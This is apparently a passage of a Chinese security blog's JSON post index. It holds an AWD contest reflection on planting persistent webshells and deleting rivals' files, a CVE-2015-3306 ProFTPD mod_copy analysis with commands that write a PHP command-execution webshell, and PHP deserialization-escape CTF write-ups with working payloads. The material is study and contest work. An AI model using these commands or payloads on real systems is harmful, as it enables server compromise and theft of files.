D盾扫描默认后门 -&gt; 编写PY脚本进行批量种植不死马 -&gt; 不死马维持权限持续Getflag 但是当时只是在用PY脚本利用默认后门去批量Getflag 这就导致了后期后门被修复的情况下，不能与前面的队伍缩小差距 而当时的web权限给得很大，可以删掉 /var/www/html 下的内容 如果当时有使用不死马，那就可以进行删除操作，阻止其他队伍得分 同时利用不死马来Getflag，这样就可以迅速缩小差距 如果是比赛水准稍微高一些的话，应该不会出现这种web权限过大的情况 那么可以尝试使用不死马来帮助别人Patch掉已知后门 Defend Web源码的备份与数据库的备份和还原自然无需多言 主要是日志审计以及流量捕获 通过这两者来协助自己分析服务器上仍存在的漏洞 或者是在某个目录下存在不死马 其次，分析不死马流量之后也可以尝试重放来借别人的不死马Getflag 一般Hash马的密码都是一样的，可以尝试一波乌鸦坐飞机 但是当时貌似没有权限去监听网卡，很纳闷","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"Reflection","slug":"Reflection","permalink":"https://yoloyolo.top/tags/Reflection/"}]},{"title":"CVE-2015-3306 浅析","slug":"EZ-Analysis-For-CVE-2015-3306","date":"2021-01-14T12:17:21.000Z","updated":"2021-01-25T16:43:51.000Z","comments":true,"path":"2021/01/14/EZ-Analysis-For-CVE-2015-3306/","link":"","permalink":"https://yoloyolo.top/2021/01/14/EZ-Analysis-For-CVE-2015-3306/","excerpt":"ProFTPD 1.3.5 mod_copy RCE","text":"ProFTPD 1.3.5 mod_copy RCE 该漏洞的描述如下 12The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.ProFTPD 1.3.5中的mod_copy模块允许远程入侵者通过site cpfr和site cpto命令进行任意文件读写 基于任意文件读写的操作，可以将目标机器上的一些敏感信息文件拷贝至可访问路径(WEB路径/SMB路径/etc.)来进行读取 甚至可以进行写入WebShell的操作，操作如下 1234site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php /proc/[pid]/cmdline /proc/[pid]/cmdline This read-only file holds the complete command line for theprocess, unless the process is a zombie. 进程在执行命令之前会从该文件获取命令，所以ftp进程在执行 site cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php 时 /proc/self/cmdline 中的内容已经变成了 10.100.120.31:57420: SITE cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php 即拷贝这段内容至 /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php 后面两条命令的操作即为修改文件名 即可以使用该漏洞来进行WebShell的写入操作","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"FTP","slug":"FTP","permalink":"https://yoloyolo.top/tags/FTP/"},{"name":"CVE","slug":"CVE","permalink":"https://yoloyolo.top/tags/CVE/"}]},{"title":"PHP反序列化字符串逃逸","slug":"PHP-Unserialize-String-Escape","date":"2021-01-14T10:58:23.000Z","updated":"2021-01-25T16:41:23.000Z","comments":true,"path":"2021/01/14/PHP-Unserialize-String-Escape/","link":"","permalink":"https://yoloyolo.top/2021/01/14/PHP-Unserialize-String-Escape/","excerpt":"PHP反序列化字符串逃逸小结","text":"PHP反序列化字符串逃逸小结 101 正常的序列化字符串进行反序列化 12345678910echo var_dump(unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;&#x27;));object(test)#2 (3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;pass&quot;]=&gt; string(5) &quot;admin&quot;&#125; 非正常 12345678910echo var_dump(unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacked&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;&#x27;));object(test)#2 (3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;pass&quot;]=&gt; string(6) &quot;hacked&quot;&#125; 这里我们把用户名处的数据改为 admin&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacked&quot;;&#125; 而之后的 &quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125; 则会被忽略 [0CTF 2016]piapiapia 12345678910#update.phpif(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;);move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);$user-&gt;update_profile($username, serialize($profile)); 在更新信息时，nickname参数可以使用数组类型bypass长度限制 但无法直接控制 $profile['photo'] 的内容 123456789#profile.php$username = $_SESSION[&#x27;username&#x27;];$profile=$user-&gt;show_profile($username);$profile = unserialize($profile);$phone = $profile[&#x27;phone&#x27;];$email = $profile[&#x27;email&#x27;];$nickname = $profile[&#x27;nickname&#x27;];$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); 在显示信息时， $profile['photo'] 为读取的文件 此题思路即为将该参数的内容改为存有flag的文件 123456789101112131415161718#class.phppublic function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile;&#125;public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string);&#125; 存入信息时，存在字符替换，其中&quot;where&quot; -&gt; &quot;hacker&quot;存在字符串长度变长的问题 12345678#config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; 需要读取的文件为config.php 简单测试一下序列化的结果 123456789$file[&#x27;tmp_name&#x27;] = &#x27;11111&#x27;;move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1@1.1&#x27;;$profile[&#x27;nickname&#x27;] = array(&#x27;1111111111&#x27;);$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);echo serialize($profile);a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:10:&quot;1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 那么可以在nickname处作一些处理，我们要读取的内容为config.php 那么可以设置nickname的值为 1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php 结果如下 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:41:&quot;1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 但是nickname中i:0;s:41仍然限定了字符串的长度，反序列化时会将 1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php 作为值 这时候可以用到&quot;where&quot; -&gt; &quot;hacker&quot;这个字符串替换的机制 数据的处理流程为&quot;序列化-&gt;处理字符串-&gt;反序列化&quot; 那么就存在如下情况 1&#123;i:0;s:6:&quot;where&quot;&quot;;&#125; -&gt; &#123;i:0;s:6:&quot;hacker&quot;&quot;;&#125; 输入为where&quot; 而替换之后可以使得&quot;进行逃逸 基于这个情况就可以进行读取文件的操作 输入的nickname为 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php 序列化的结果为 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 进行替换之后为 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 即可使得所需内容 &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php 进行逃逸 [安洵杯 2019]easy_serialize_php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 粗略看上去是需要控制 $_SESSION['img'] 这个参数来读取，但是这个参数是无法直接进行控制的 即使 extract($_POST); 可以对 $_SESSION['img'] 进行变量覆盖，但是还是会被之后的代码再次覆盖 filter()函数会对一些字符串替换为空，用来处理序列化的结果是不安全的 默认的 $serialize_info 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 可以考虑使用变量覆盖来重新构造序列化字符串 123_SESSION[user]=&amp;_SESSION[function]=a:3:&#123;s:4:&quot;user&quot;;s:0:&quot;&quot;;s:8:&quot;function&quot;;s:0:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 可以在function处构造img参数 然后在user处构造被过滤的字符串，将fuction转为user的值，从而使function处构造的img参数可以逃逸 123_SESSION[user]=phpflagflagphpflagflag&amp;_SESSION[function]=;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:56:&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 对序列化的结果进行操作是不安全的，应当尽量避免","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"}]},{"title":"Rebuild Project","slug":"Rebuild-Project","date":"2021-01-10T14:33:23.000Z","updated":"2021-01-14T12:25:14.000Z","comments":true,"path":"2021/01/10/Rebuild-Project/","link":"","permalink":"https://yoloyolo.top/2021/01/10/Rebuild-Project/","excerpt":"","text":"Start at 2021.01.14 Going to explore the unknown.","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/tags/Talk/"}]}],"categories":[{"name":"WrtiteUp","slug":"WrtiteUp","permalink":"https://yoloyolo.top/categories/WrtiteUp/"},{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"},{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"},{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"},{"name":"CBC","slug":"CBC","permalink":"https://yoloyolo.top/tags/CBC/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"},{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"},{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"},{"name":"MT19937","slug":"MT19937","permalink":"https://yoloyolo.top/tags/MT19937/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://yoloyolo.top/tags/HTTPS/"},{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"POP","slug":"POP","permalink":"https://yoloyolo.top/tags/POP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Cyber_Attribution","slug":"Cyber-Attribution","permalink":"https://yoloyolo.top/tags/Cyber-Attribution/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://yoloyolo.top/tags/LeetCode/"},{"name":"Post_Pentest","slug":"Post-Pentest","permalink":"https://yoloyolo.top/tags/Post-Pentest/"},{"name":"Anti_AntiVirus","slug":"Anti-AntiVirus","permalink":"https://yoloyolo.top/tags/Anti-AntiVirus/"},{"name":"Meterpreter","slug":"Meterpreter","permalink":"https://yoloyolo.top/tags/Meterpreter/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://yoloyolo.top/tags/CobaltStrike/"},{"name":"Android","slug":"Android","permalink":"https://yoloyolo.top/tags/Android/"},{"name":"Application_Test","slug":"Application-Test","permalink":"https://yoloyolo.top/tags/Application-Test/"},{"name":"Lock_Picking","slug":"Lock-Picking","permalink":"https://yoloyolo.top/tags/Lock-Picking/"},{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"},{"name":"PEB","slug":"PEB","permalink":"https://yoloyolo.top/tags/PEB/"},{"name":"Anti-Debug","slug":"Anti-Debug","permalink":"https://yoloyolo.top/tags/Anti-Debug/"},{"name":"LFSR","slug":"LFSR","permalink":"https://yoloyolo.top/tags/LFSR/"},{"name":"HTTP","slug":"HTTP","permalink":"https://yoloyolo.top/tags/HTTP/"},{"name":"WebShell","slug":"WebShell","permalink":"https://yoloyolo.top/tags/WebShell/"},{"name":"Mysql","slug":"Mysql","permalink":"https://yoloyolo.top/tags/Mysql/"},{"name":"Misc","slug":"Misc","permalink":"https://yoloyolo.top/tags/Misc/"},{"name":"Memory_Forensics","slug":"Memory-Forensics","permalink":"https://yoloyolo.top/tags/Memory-Forensics/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"BSGS","slug":"BSGS","permalink":"https://yoloyolo.top/tags/BSGS/"},{"name":"discrete_log","slug":"discrete-log","permalink":"https://yoloyolo.top/tags/discrete-log/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"https://yoloyolo.top/tags/Coppersmith/"},{"name":"XSS","slug":"XSS","permalink":"https://yoloyolo.top/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://yoloyolo.top/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://yoloyolo.top/tags/SSRF/"},{"name":"ECB","slug":"ECB","permalink":"https://yoloyolo.top/tags/ECB/"},{"name":"SQL_Injection","slug":"SQL-Injection","permalink":"https://yoloyolo.top/tags/SQL-Injection/"},{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"File_Upload","slug":"File-Upload","permalink":"https://yoloyolo.top/tags/File-Upload/"},{"name":"Reflection","slug":"Reflection","permalink":"https://yoloyolo.top/tags/Reflection/"},{"name":"FTP","slug":"FTP","permalink":"https://yoloyolo.top/tags/FTP/"},{"name":"CVE","slug":"CVE","permalink":"https://yoloyolo.top/tags/CVE/"},{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/tags/Talk/"}]}